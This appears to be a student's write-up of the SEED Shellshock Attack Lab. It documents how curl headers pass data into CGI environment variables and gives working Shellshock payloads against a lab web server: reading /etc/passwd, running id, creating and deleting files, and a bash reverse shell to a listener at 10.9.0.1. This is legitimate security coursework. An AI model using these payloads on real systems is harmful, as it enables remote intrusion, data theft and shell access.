<p align="center">
    Lab 02 - Shellshock Attack Lab <br/>
    By Patrick O'Connor <br/>
    v75j556 <br/>
    CSCI 476 - Spring 2021 <br/>

</p>

# Table of Contents
- [ About this project ](#desc)
	- [ File Structure ](#struct)
- [ Task Answers ](#tasks)
- [Contact](#contact)
	- <a href= "mailto: p.oconnormsu@gmail.com?subject= Lab 01 OConnor"> Click here to send email</a>

<a name="desc"></a>
# About this project
This lab is for students to get first-hand experience with this interesting attack, understand how it works, and think about more general lessons that we can take aware from this attack. The first version of this lab was developed on September 29, 2014, just five days after the attack was reported.


Started: February 12, 2021
\
Last Updated: February 17, 2021
\
Due Date: February 16, 2021

<a name="struct"></a>
# File Structure
- lab02
	- README.md

<a name="tasks"></a>
# Task 1: Experimenting with Bash Functions
Design an experiment to verify whether ```/bin/bash_shellshock``` is vulnerable to the Shellshock attack. Conduct the same experiment on the patched version ```/bin/bash/``` and report your observations.
\
The following curl web request sent to the webserver and proccessed through a vulnerable version of bash shell.  
curl -A "test" -v http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
\
As we can input environmental variables with the above curl request we should continue as the environment variable ```User-Agent``` and ```HTTP_USER_AGENT``` is created and we can input variables outside the realm of normal use.

# Task 2: Passing Data to Bash via Environment Variables
To exploit a Shellshock vulnerability in a bash-based CGI program, attackers need to pass their data to the vulnerable bash program, and the data needs to be passed via an environment variable. In this task, we need to see how we can achieve this goal. We have provided another CGI program (getenv.cgi) on the server to help you identify what user data is translated into environment variables, which are ultimately passed to a CGI program. This CGI program prints out all its environment variables for the current process.
```
#!/bin/bash_shellshock

echo "Content-Type: text/plain"
echo
echo "*** ENVIRONMENT VARIABLES***"
strings /proc/$$/environ
```

## Task 2(a): Passing Data via the Browser
In the code above, line 6 prints out the contents of all the environment variables in the current process. Please identify which of the environment variable(s)’ values are set according to data sent from the browser.
\
The following variables are set according to data sent from the browser (HTTP_Host through Host), (HTTP_USER_AGENT through User-Agent), (HTTP_ACCEPT through Accept)... It can be seen that any of the environment variables that are started with ```HTTP_``` are set according to data sent from data. This gives us an opportunity to attack the environment variables based on setting these variable with requests/curl.

## Task 2(b): Passing Data via ```curl```
Using curl and the URL of docker web-server we can successfully return or pass information/data back and forth. More details on options to follow.

### Task 2(b)(a): The ```-v``` option
Sending the curl request with ```curl -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi``` we are returned information on the web-server that is copied below. This information is  an assortment of server info.

```*   Trying 10.9.0.80:80...
* TCP_NODELAY set
* Connected to www.seedlab-shellshock.com (10.9.0.80) port 80 (#0)
> GET /cgi-bin/getenv.cgi HTTP/1.1
> Host: www.seedlab-shellshock.com
> User-Agent: curl/7.68.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Fri, 12 Feb 2021 23:57:18 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/plain
<
ENVIRONMENTAL VARIABLES FOLLOW THIS...
```

### Task 2(b)(b): The ```-A``` option
By using the request command with option```-A``` such as ```curl -A "my data" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi``` we are able to set our ```HTTP_USER_AGENT=my data```. This ```USER-AGENT``` is set through the text within the double quotes that is follows ```curl -A```.

### Task 2(b)(c): The ```-e``` option
Using the ```curl -e "my data" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi``` it is possible to edit the ```Referer``` and ```HTTP_REFERER=my data```.

### Task 2(b)(d): The ```-H``` option
Using the ```curl -H "AAAAAA: BBBBBB" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi``` it is possible to create a new environment variable that is label in this case ```AAAAAA: BBBBBB```.

### Task 2(b)(e): Developing an Initial Attack Strategy
After completing tasks 2.2.1-2.2.4, please describe which options of curl could be used to inject data into the environment variables of the target CGI program.
\
At this point, I am thinking that the three of the options ( ```-A```, ```-e```, and ```-H```) are possible  options for injecting data into the environment variables of target CGI program.


# Task 3: Launching the Shellshock Attack
The attack does not depend on what is in the CGI program, as it targets the bash program, which is invoked before the actual CGI script is executed. You should launch your attack targeting the CGI script located at the following URL: http://www.seedlab-shellshock.com/cgi-bin/vul.cgi. Your ultimate objective in each task is to get the server to run an arbitrary command of your choosing.
\
For each objective, please report:

1. A summary of your approach, with relevant command inputs/outputs
2. The curl option you used
3. The result (i.e., was your attack successful? Why or why not? Other observations?)


Note that for each of the following sub-tasks you only need to use one of the ```curl``` options in your attack, but in total, you need to use three different ```curl``` options.

## Task 3(a): Shellshock & Reading A File
Get the server to send back the content of the ```/etc/passwd``` file


The approach is to use User Agent to pass through ```/bin/cat``` to the ```/etc/passwd``` file.
\
The curl command is ```curl -A ' () { :; }; echo "Content-Type: text/plain"; echo ""; /bin/cat /etc/passwd' -v  http://www.seedlab-shellshock.com/cgi-bin/vul.cgi```.
\
My attempt was successful and this can be proven by using option ```-A``` to find the ```' () { :; }; echo "Content-Type: text/plain"; echo ""; /bin/cat /etc/passwd'```. After this the ```/etc/passwd``` file is returned to seed VM through ```/bin/cat```.


## Task 3(b): Shellshock & Process Info
Get the server to tell you its process’ user ID. You can use the /bin/id command to print out the ID information.
\
I was able to get the process' user ID through using the following curl command ```curl -A ' () { :; }; echo "Content-Type: text/plain"; echo ""; /bin/id' http://www.seedlab-shellshock.com/cgi-bin/vul.cgi```. This will return to the seed shell ```uid=33(www-data) gid=33(www-data) groups=33(www-data)```. I believe that with this information we will be able to alter the ownership or privileges and access information that isn't "ours".

## Task 3(c): Shellshock & Creating A File
Get the server to create a file inside the ```/tmp``` folder. Using ```docksh (container ID)``` verify.
\
In order to create a file we can use ```/bin/touch``` along with the destination and file name in the format that follows. ```curl -e '() { :;}; echo "Content-Type: text/plain"; echo; /bin/touch  /tmp/test.txt' -v  http://www.seedlab-shellshock.com/cgi-bin/vul.cgi```. It is possible to ```docksh (Container ID)``` to check within the ```/tmp``` directory or we can use a command similar to the approach in Task 3(a).


## Task 3(d): Shellshock & Deleting A File
Get the server to delete the file that you just created inside the ```/tmp``` folder.
\
Using a similar approach as the previous task we can use ```/bin/rm``` and a file location to remove files. In order to remove the file previously created ```test.txt``` we will use ```curl -e '() { :;}; echo "Content-Type: text/plain"; echo; /bin/rm /tmp/test.txt' -v  http://www.seedlab-shellshock.com/cgi-bin/vul.cgi```. Just as before we can check through ```docksh``` and then looking into the folder or by using ```curl -e '() { :;}; echo "Content-Type: text/plain"; echo; /bin/ls /tmp' -v  http://www.seedlab-shellshock.com/cgi-bin/vul.cgi```. This attack is success and very interesting that you can do most bash commands through ```/bin/*/``` and a location. This is surprising and seems extremely vulnerable and I am looking forward to next doing privileged files.


## Task 3(e): Shellshock & Reading A Privileged File
(Try) to “steal” the shadow file ```/etc/shadow``` from the server.
\
I was unable to steal the shadow file. Although I was not able to steal the file, I believe that there is a way using Set-UID inputs on the vulnerable ```bash_shellshock```. I have been trying to change ownership of the file through ```sudo chown www-data /etc/shadow``` but cant figure out the syntax in bash curl commands in order to complete this. Along with this I attempted to use a ```sudo``` user within the curl requests but that did not get me anything in return. I also think that there is a way to access the privileged files through changing the effective user id as we can currently see what are id is. Without changing are user id or group id that is currently ```uid=33(www-data) gid=33(www-data) groups=33(www-data)``` it does not seem to be possible.


# Task 4: Getting a Reverse Shell via Shellshock
In this task, you need to demonstrate that you can get a reverse shell from the victim (the web server) back to the attacker’s machine using the Shell-shock attack.
\
I was capable of getting a reverse shell by using two different terminals and running separate commands on each. The more simple command was ```nc -nlv 9090``` which is telling my SEED VM to listen on ```port 9090``` for a connection request. The second and more complicated command is sent from inside the ```02_shellshock``` folder and is ```curl -A '() { :; }; /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1' http://www.seedlab-shellshock.com/cgi-bin/vul.cgi```. After running this command, using the first terminal window that was awaiting connection request we can now use bash from outside the webserver container. This is extremely interesting and we can return items such as ```whoami = www-data``` or any of the previously completed task in task 3 without having to web request in. Although I could not get ```sudo``` to work so accessing a root owned document was not possible.   



# Task 5: Using the Patched Bash
Now, let us use a version of the bash program that has already been patched. The program /bin/bash is a patched version.
\
Please replace the first line of the CGI programs with this program to have your CGI programs used the patched version of bash.
\
Repeat Task 3 and describe your observations.
\
After repeating Task 3 in the patched Bash, I was unable to receive any information/data back that besides the environment variables. The curl requests could in fact still set the proper variable through options ( ```-A```, ```-e```, and ```-H```). This does in fact make sense as there are multiple patches on ```bash``` since the exposure of the 2014 shell-shock vulnerability. After doing some research there are still some ways of abusing ```curl``` to maliciously attack web servers although this basic environment variables does not work.


<a name="contact"></a>
<a href= "mailto: p.oconnormsu@gmail.com?subject= Lab 01 OConnor"> Click here to send email</a>
